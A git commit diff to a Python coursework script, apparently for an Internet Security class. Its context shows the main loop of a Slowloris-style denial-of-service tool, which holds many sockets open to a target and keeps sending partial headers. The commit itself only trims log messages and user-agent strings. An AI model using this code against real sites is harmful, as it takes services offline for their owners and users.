b4fb53c71577c3fe790ef52ca1ad0380863fa88c
460N1 <agon.hoxha@uni-pr.edu>
2019-01-15 21:39:57 +0100

    Slimming

--- IS_SulmimDOS/ISAttack.py
+++ IS_SulmimDOS/ISAttack.py
@@ -1,9 +1,9 @@
-# --- /****************************************************\
-# --- |         AUTHOR:  Agon Hoxha,  140704110004         |
-# --- |    SUBJECT: Internet Security,  VITI: 2018/2019    |
-# --- |    TASK: Developing Python application for site    |
-# --- |                stress testing,   #6                |
-# --- \****************************************************/
+# /************************************************\
+# |       AUTHOR:  Agon Hoxha,  140704110004       |
+# |  SUBJECT: Internet Security,  VITI: 2018/2019  |
+# |  TASK: Developing Python application for site  |
+# |                stress testing,   #6            |
+# \************************************************/
 
 import argparse
 import logging
@@ -40,7 +40,7 @@ if not args.host:
     sys.exit()
 
 if args.verbose and args.quiet:
-    print("ERROR: Mode conflict!\nYou can only use one: either -d or -q!")
+    print("You can only use one: either -d or -q!")
     sys.exit()
 else:
     if args.verbose:
@@ -53,24 +53,18 @@ else:
 list_of_sockets = []
 
 user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
@@ -80,7 +74,7 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-logging.info("\nAuthor: Agon Hoxha \nVersion: 0.92 \nDate: 15/01/2019 \nPurpose: Internet Security Task")
+logging.info("\nAuthor: Agon Hoxha \nVersion: 0.94 \nFinished: 15/01/2019")
 
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -102,18 +96,18 @@ def main():
     ip = args.host
     socket_count = args.sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
-    logging.info("Starting socket creation...")
+    logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
-            logging.debug("Creating socket nr %s", _)
+            logging.debug("Creating socket %s", _)
             s = init_socket(ip)
         except socket.error:
-            logging.info("Socket creation failed. Potential connection error.")
+            logging.info("Socket creation failed. Connection error.")
             break
         list_of_sockets.append(s)
     while True:
         try:
-            logging.info("Sending keep-alive headers using %s sockets...", len(list_of_sockets))
+            logging.info("Sending keep-alive headers using %s sockets.", len(list_of_sockets))
             for s in list(list_of_sockets):
                 try:
                     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
@@ -121,13 +115,13 @@ def main():
                     list_of_sockets.remove(s) 
                     
             for _ in range(socket_count - len(list_of_sockets)):
-                logging.debug("Recreating sockets...")
+                logging.debug("Recreating sockets.")
                 try:
                     s = init_socket(ip)
                     if s:
                         list_of_sockets.append(s)
                 except socket.error:
-                    logging.info("Socket recreation failed. Possible connection error.")
+                    logging.info("Socket recreation failed. Connection error.")
                     break
             time.sleep(15)
         
